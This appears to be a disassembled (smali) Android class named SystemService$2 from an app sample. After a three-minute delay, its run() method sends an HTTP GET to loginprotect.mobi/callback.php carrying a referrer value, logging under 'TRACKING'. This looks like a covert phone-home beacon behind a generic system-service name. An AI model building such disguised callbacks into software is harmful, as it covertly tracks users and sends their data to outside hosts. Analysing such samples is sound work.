.class Lcom/fa/c/SystemService$2;
.super Ljava/lang/Object;
.source "SystemService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/fa/c/SystemService;->Knock()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/fa/c/SystemService;


# direct methods
.method constructor <init>(Lcom/fa/c/SystemService;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/fa/c/SystemService$2;->this$0:Lcom/fa/c/SystemService;

    .line 153
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    .prologue
    .line 160
    const-string v4, "TRACKING"

    const-string v5, "Ref: r"

    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 164
    const-wide/32 v4, 0x2bf20

    :try_start_0
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 172
    :goto_0
    const-string v0, "http://loginprotect.mobi/callback.php?referer="

    .line 174
    .local v0, "link":Ljava/lang/String;
    iget-object v4, p0, Lcom/fa/c/SystemService$2;->this$0:Lcom/fa/c/SystemService;

    invoke-static {v4}, Lcom/fa/c/SystemService;->access$1(Lcom/fa/c/SystemService;)Ljava/lang/String;

    move-result-object v1

    .line 176
    .local v1, "referrer":Ljava/lang/String;
    const-string v4, "TRACKING"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "Refff: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 178
    if-eqz v1, :cond_0

    .line 180
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 185
    :cond_0
    :try_start_1
    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 186
    .local v2, "url":Ljava/net/URL;
    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v3

    check-cast v3, Ljava/net/HttpURLConnection;

    .line 187
    .local v3, "urlConnection":Ljava/net/HttpURLConnection;
    const-string v4, "GET"

    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 188
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->connect()V

    .line 190
    const-string v4, "TRACKING"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "Status: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 191
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 200
    .end local v2    # "url":Ljava/net/URL;
    .end local v3    # "urlConnection":Ljava/net/HttpURLConnection;
    :goto_1
    return-void

    .line 167
    .end local v0    # "link":Ljava/lang/String;
    .end local v1    # "referrer":Ljava/lang/String;
    :catch_0
    move-exception v4

    goto :goto_0

    .line 194
    .restart local v0    # "link":Ljava/lang/String;
    .restart local v1    # "referrer":Ljava/lang/String;
    :catch_1
    move-exception v4

    goto :goto_1
.end method
